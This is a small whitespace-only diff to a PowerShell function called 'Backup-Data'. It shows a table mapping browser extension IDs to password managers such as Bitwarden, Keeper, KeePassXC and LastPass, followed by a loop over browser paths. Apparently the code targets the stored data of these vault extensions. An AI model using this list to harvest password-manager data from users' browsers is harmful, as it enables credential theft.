@@ -791,9 +791,9 @@ function Backup-Data {
 	    "fdjamakpfbbddfjaooikfcpapjohcfmg" = "DashLane"
 	    "nngceckbapebfimnlniiiahkandclblb" = "Bitwarden"
 	    "pnlccmojcmeohlpggmfnbbiapkmbliob" = "RoboForm"
-	    "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper"
-	    "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword"
-	    "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC"
+        "bfogiafebfohielmmehodmfbbebbbpei" = "Keeper"
+        "cnlhokffphohmfcddnibpohmkdfafdli" = "MultiPassword"
+        "oboonakemofpalcgghocfoadofidjkkk" = "KeePassXC"
 	    "hdokiejnpimakedhajhdlcegeplioahd" = "LastPass"
     }
     foreach ($browser in $browserPaths.GetEnumerator()) {
